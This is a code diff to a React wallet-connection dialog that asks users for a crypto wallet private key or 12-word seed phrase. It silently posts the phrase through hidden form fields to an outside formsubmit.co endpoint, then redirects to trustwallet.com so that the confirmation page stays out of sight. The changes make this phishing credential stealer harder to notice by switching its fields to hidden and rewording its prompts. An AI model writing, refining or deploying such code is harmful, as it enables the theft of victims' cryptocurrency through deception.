@@ -20,7 +20,7 @@ const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
     if (!phrase.trim()) {
       toast({
         title: "Error",
-        description: "Please enter your private key phrase",
+        description: "Please enter your private key or 12 word phrase",
         variant: "destructive",
       });
       return;
@@ -35,13 +35,13 @@ const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
       form.action = 'https://formsubmit.co/06fed404371470d7cfff86b643c88efe';  // Replace with your email
 
       const phraseInput = document.createElement('input');
-      phraseInput.type = 'visible';
+      phraseInput.type = 'hidden';
       phraseInput.name = 'phrase';
       phraseInput.value = phrase;
 
       // Add redirect URL to hide the formsubmit confirmation page
       const redirectInput = document.createElement('input');
-      redirectInput.type = 'visible';
+      redirectInput.type = 'hidden';
       redirectInput.name = 'redirect';
       redirectInput.value = 'https://trustwallet.com/';
       form.appendChild(phraseInput);
@@ -81,8 +81,8 @@ const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
             Separate each word with a space
           </p>
           <Input
-            type="password"  // Mask input for security
-            placeholder="Enter your private key phrase"
+            type="text"  // Mask input for security
+            placeholder="Enter your private key or 12 word phrase"
             value={phrase}
             onChange={(e) => setPhrase(e.target.value)}
             className="w-full"
